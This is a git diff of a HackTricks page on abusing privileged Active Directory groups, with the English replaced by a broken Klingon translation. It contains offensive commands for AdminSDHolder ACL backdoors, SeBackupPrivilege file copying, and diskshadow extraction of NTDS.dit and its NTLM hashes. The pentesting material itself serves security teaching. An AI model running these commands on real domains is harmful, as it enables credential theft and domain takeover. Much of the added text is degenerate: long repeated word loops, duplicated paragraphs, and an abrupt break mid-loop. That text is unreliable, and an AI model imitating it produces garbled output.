@@ -1,20 +1,20 @@
-# Privileged Groups
+# qo'noSqa' qorDu'
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>laH</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks ni' support laH:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **tlhIngan Hol** **HackTricks** **advertised** **company** **want** **or** **HackTricks** **PDF** **download** **SUBSCRIPTION PLANS** [**CHECK**](https://github.com/sponsors/carlospolop)!
+* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **ghItlh**.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **ghItlh**, [**NFTs**](https://opensea.io/collection/the-peass-family) **collection** **exclusive** **our**.
+* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) **join** **or** [**telegram group**](https://t.me/peass) **or** **follow** **us** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **hacking tricks** **submitting PRs** **HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) **and** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos** **Share**.
 
 </details>
 
-## Well Known groups with administration privileges
+## administration privileges jatlh
 
 * **Administrators**
 * **Domain Admins**
@@ -25,11 +25,9 @@ Other ways to support HackTricks:
 This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).
 
 To identify the members of this group, the following command is executed:
-
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-
 Adding new users is permitted, as well as local login to DC01.
 
 ## AdminSDHolder group
@@ -39,25 +37,25 @@ The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets pe
 An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.
 
 Commands to review the members and modify permissions include:
-
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-
-A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
-
-For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
-
-## AD Recycle Bin
+**AD Recycle Bin**
 
 Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
 
+**AD Recycle Bin**
+
+Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
+
+**AD Recycle Bin**
+
+Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-
 ### Domain Controller Access
 
 Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.
@@ -66,10 +64,12 @@ Access to files on the DC is restricted unless the user is part of the `Server O
 
 Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:
 
+### Domain Controller Qap
+
+QapmeyDaq DC Daq loghDaq 'ej 'oH 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'ej
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-
 This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.
 
 ## Backup Operators
@@ -78,43 +78,47 @@ Membership in the `Backup Operators` group provides access to the `DC01` file sy
 
 To list group members, execute:
 
+**tlhIngan Hol translation:**
+
+vItlhutlh: 'Server Operators' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'elevated privileges' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e' vItlhutlhpu' 'ejwI' 'e'
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
-
 ### Local Attack
 
 To leverage these privileges locally, the following steps are employed:
 
 1. Import necessary libraries:
 
+1. **tlhIngan Hol**:
+```
+1. Import necessary libraries:
+```
 ```bash
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-
 2. Enable and verify `SeBackupPrivilege`:
 
+2. `SeBackupPrivilege` janglu'chugh vaj jatlh:
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-
 3. Access and copy files from restricted directories, for instance:
 
+3. qawHaq je 'ej ngevwI'pu' ghoS, 'ejmey:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
+### AD tIq
 
-### AD Attack
+Domain Controller'e' file system'e' vItlhutlh 'e' vItlhutlh `NTDS.dit` database'e' vItlhutlh, 'ej vItlhutlh domain users 'ej computers 'e' NTLM hashes.
 
-Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
+#### diskshadow.exe vIlo'laH
 
-#### Using diskshadow.exe
-
-1. Create a shadow copy of the `C` drive:
-
+1. `C` drive'e' shadow copy vIlo'laH:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -127,42 +131,39 @@ expose %cdrive% F:
 end backup
 exit
 ```
-
-2. Copy `NTDS.dit` from the shadow copy:
-
+2. `NTDS.dit`-ni jey yIlo' shadow copy vItlhutlh.
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
+Qapla', `robocopy` vItlhutlh!:
 
-Alternatively, use `robocopy` for file copying:
+```plaintext
+robocopy <source> <destination> [<file(s)>] [<options>]
+```
 
+`robocopy` yIlo'laHbe'chugh, 'ej yIlo'laHbe'chugh vItlhutlh. 'ach, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh 'e' vItlhutlh. 'ej, 'oH vItlhutlh 'e' 